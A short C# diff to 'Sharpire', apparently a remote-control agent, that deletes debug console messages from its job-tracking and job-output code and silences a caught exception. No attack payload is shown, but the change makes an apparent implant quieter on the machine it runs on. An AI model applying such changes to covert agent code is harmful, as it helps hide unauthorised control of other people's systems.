@@ -25,7 +25,6 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         internal void CheckAgentJobs(ref Byte[] packets, ref Coms coms)
         {
-            Console.WriteLine("checkAgentJobs");
             lock (jobs)
             {
                 List<String> jobsToRemove = new List<String>();
@@ -58,23 +57,20 @@ namespace Sharpire
         internal Byte[] GetAgentJobsOutput(ref Coms coms)
         {
             Byte[] jobResults = new Byte[0];
-            Console.WriteLine("getAgentJobsOutput");
             lock (jobs)
             {
                 List<String> jobsToRemove = new List<String>();
                 foreach (String jobName in jobs.Keys)
                 {
-                    Console.WriteLine(jobName);
                     String results = "";
                     if (jobs[jobName].IsCompleted())
                     {
                         try
                         {
                             results = jobs[jobName].GetOutput();
-                            Console.WriteLine(results);
                             jobs[jobName].KillThread();
                         }
-                        catch (NullReferenceException ex) { Console.WriteLine(ex); }
+                        catch (NullReferenceException) { }
                         jobsToRemove.Add(jobName);
                     }
                     else
@@ -192,10 +188,8 @@ namespace Sharpire
                 {
                     if (true == isFinished)
                     {
-                        Console.WriteLine("Finished");
                         return true;
                     }
-                    Console.WriteLine("Not Finished");
                     return false;
                 }
                 else
